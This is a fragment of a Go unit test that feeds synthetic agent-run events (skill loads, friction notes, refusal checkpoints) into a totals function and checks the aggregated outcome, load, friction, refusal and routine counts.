	refusal := runs.Event{Type: runs.EventCheckpoint, Author: runs.ByFabrica, Status: runs.Failed, Summary: "Refused: stub is outdated"}
	add("acme", "pr-review", "succeeded", load("07:00:00", "skill", "a"), load("07:00:01", "skill", "a"), load("07:00:02", "rule", "r"), load("07:00:03", "routine", "pr-review"))
	add("acme", "pr-review", "failed", load("07:00:00", "skill", "a"), refusal, refusal, runs.Event{Type: runs.EventFriction, Kind: "tools", Note: "x"})
	add("acme", "", "stale", runs.Event{Type: runs.EventFriction, Kind: "tools", Note: "y"}, runs.Event{Type: runs.EventFriction, Kind: "info", Note: "z"})
	// An agent's failed checkpoint is not a refusal.
	add("other", "pr-review", "failed", runs.Event{Type: runs.EventCheckpoint, Author: runs.ByAgent, Status: runs.Failed, Summary: "Refused: by me"})
	for i := range 12 {
		add("acme", "many", "succeeded", load("07:00:00", "skill", "skill"+string(rune('a'+i))))
	}

	got := totalsOf(list)
	if got.outcomes["succeeded"] != 13 || got.outcomes["failed"] != 2 || got.outcomes["stale"] != 1 {
		t.Errorf("outcomes = %v", got.outcomes)
	}
	// A skill loaded twice in a run is one run that loaded it. Routines
	// aren't counted, and only ten of each kind are listed.
	if got.loads[0] != (loadTotals{"skill", "a", 2}) || got.loads[len(got.loads)-1] != (loadTotals{"rule", "r", 1}) || len(got.loads) != 11 {
		t.Errorf("loads = %v", got.loads)
	}
	if !slices.Equal(got.friction, []count{{"tools", 2}, {"info", 1}}) || !slices.Equal(got.refusals, []count{{"Refused: stub is outdated", 2}}) {
		t.Errorf("friction %v, refusals %v", got.friction, got.refusals)
	}
	if len(got.routines) != 4 || got.routines[0].routine != "many" || got.routines[0].runs != 12 {
		t.Errorf("routines = %+v", got.routines)
	}
}
